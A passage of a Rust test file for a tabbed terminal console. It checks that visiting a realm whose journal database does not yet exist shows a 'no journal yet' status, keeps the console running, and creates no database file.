        let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
        script(&[Key::Char(']'), Key::Quit]);
        let mut tui = tabbed_tui(&["alpha", "beta"]);
        drive(&mut terminal, &test_ops(), &mut source, &mut tui, 6).unwrap();
        // A hearth with no journal yet is a frame that says so, with the
        // keys still live and nothing counted against the give-up bound.
        assert!(
            tui.status
                .as_deref()
                .is_some_and(|said| said.contains("no journal yet")),
            "the empty hearth said so: {:?}",
            tui.status
        );
    }
    assert!(asked.contains(&1), "the visited hearth was asked about");
    assert!(!beta.exists(), "a read created a journal");
    assert!(!dir.path().join("beta.db-wal").exists());
}

/// A realm the map names before its first run has no journal yet, and
/// that is an ordinary state of the world: the hearth is EMPTY, not
/// unreadable. Visiting it shows an empty fleet, says why, and the
/// console keeps running — where an error would have counted toward
/// `WATCH_TRANSIENT_FRAMES` and ended the session in a second and a
/// quarter over a realm that has simply not run yet (ruling 2). The
/// world's other hearth is still there when the operator tabs back.
#[test]
fn a_hearth_with_no_journal_yet_is_empty_and_does_not_end_the_console() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let dir = tempfile::tempdir().unwrap();
    let alpha = dir.path().join("alpha.db");
    crate::tests::running_store(&alpha, "run-a");
    let beta = dir.path().join("beta.db");
    let hearths = [
        Hearth {
            realms: vec!["alpha".to_string()],
            journal: alpha.clone(),
        },
        Hearth {
            realms: vec!["beta".to_string()],
            journal: beta.clone(),
        },
    ];

    let mut heads = vec![None, None];
    let mut seen = None;
    let mut source = crate::tui_source(&hearths, &mut heads, &mut seen);
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
    script(&[Key::Char(']')]);
    let mut tui = tabbed_tui(&["alpha", "beta"]);
    // Well past the give-up bound: the old behaviour bailed on the
    // fifth unreadable poll, so surviving this many is the assertion.
    let code = drive(
        &mut terminal,
        &test_ops(),
        &mut source,
        &mut tui,
        crate::WATCH_TRANSIENT_FRAMES * 4,
    );
    assert!(code.is_ok(), "the console gave up: {code:?}");
    assert_eq!(tui.tab, 1);
    assert!(
        tui.status
            .as_deref()
            .is_some_and(|said| said.contains("no journal yet")),
        "{:?}",
        tui.status
    );
    // The sentence is on the frame, sanitized like every other string.
    let frame = terminal.backend().buffer().clone();
    let drawn: String = frame
        .content()
        .iter()
        .map(|cell| cell.symbol())
        .collect::<String>();
    assert!(drawn.contains("no journal yet"), "{drawn}");
    assert!(!beta.exists(), "a read created a journal");

    // And the hearth that DOES have a journal is unharmed by the visit.
    script(&[Key::Char('[')]);
    drive(&mut terminal, &test_ops(), &mut source, &mut tui, 4).unwrap();
    assert_eq!(tui.tab, 0);
    assert_eq!(tui.status, None, "the read hearth has nothing to say");
}
